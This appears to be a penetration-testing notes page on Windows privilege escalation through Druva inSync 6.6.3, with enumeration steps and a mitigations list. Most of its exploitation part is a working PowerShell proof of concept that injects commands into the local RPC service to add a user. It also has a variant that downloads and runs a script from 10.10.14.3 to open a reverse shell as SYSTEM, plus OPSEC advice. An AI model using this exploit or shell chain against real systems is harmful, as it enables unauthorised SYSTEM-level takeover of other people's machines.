## Summary

Even on well-maintained systems, privilege escalation may be possible through third-party applications running as SYSTEM. Vulnerable services or poorly configured software can be exploited for local privilege escalation (LPE). Always enumerate installed applications and running services thoroughly.
## Enumeration

### 1. Enumerate Installed Applications

```cmd
wmic product get name
```

**Sample Output:**

```
Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.28.29910
...
Druva inSync 6.6.3
...
```

> **Observation:** Druva inSync 6.6.3 is known to be vulnerable to command injection via RPC service (port 6064).
### 2. Enumerate Listening Ports

```cmd
netstat -ano | findstr 6064
```

**Sample Output:**

```
TCP    127.0.0.1:6064  ...  LISTENING       3324
```
### 3. Map PID to Process Name

```powershell
get-process -Id 3324
```

**Sample Output:**

```
Id     : 3324
Name   : inSyncCPHwnet64
```
### 4. Identify Service Name

```powershell
get-service | ? {$_.DisplayName -like 'Druva*'}
```

**Sample Output:**

```
Running  inSyncCPHService   Druva inSync Client Service
```
## Exploitation â€“ Druva inSync (v6.6.3)

### PowerShell Exploit PoC

```powershell
$ErrorActionPreference = "Stop"

$cmd = "net user pwnd /add"

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length)

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```
## Reverse Shell Variant (Safer)

### 1. Append reverse shell to PowerShell script:

```powershell
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.3 -Port 9443
```

### 2. Host `shell.ps1` via Python HTTP Server

```bash
python3 -m http.server 8080
```

### 3. Modify `$cmd` in PoC:

```powershell
$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.3:8080/shell.ps1')"
```

### 4. Launch Netcat Listener:

```bash
nc -lvnp 9443
```

**Expected Result:**

```
whoami
> nt authority\system
```
## Post-Exploitation

- Confirm SYSTEM shell
- Clean up users and artifacts if needed
- Maintain OPSEC (avoid adding users if possible)
## Mitigations

- Restrict software installation rights for users
- Regularly audit third-party software for known CVEs
- Use application whitelisting
- Patch vulnerable agents like Druva inSync
# Tags
> #Windows-Post-Exploitation #Windows-Privesc #Vulnerable_Services